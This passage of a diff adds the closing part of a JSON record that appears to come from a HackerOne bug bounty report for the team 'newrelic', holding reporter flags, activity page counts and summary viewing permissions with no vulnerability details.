+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "newrelic"
+        }
+    ],
+    "activity_page_count": 1,
+    "activity_page_number": 1,
+    "summaries": [
+        {
+            "category": "team",
+            "can_view?": true,
+            "can_create?": false
+        },
+        {
+            "category": "researcher",
+            "can_view?": true,
+            "can_create?": false
+        }
+    ]
+}
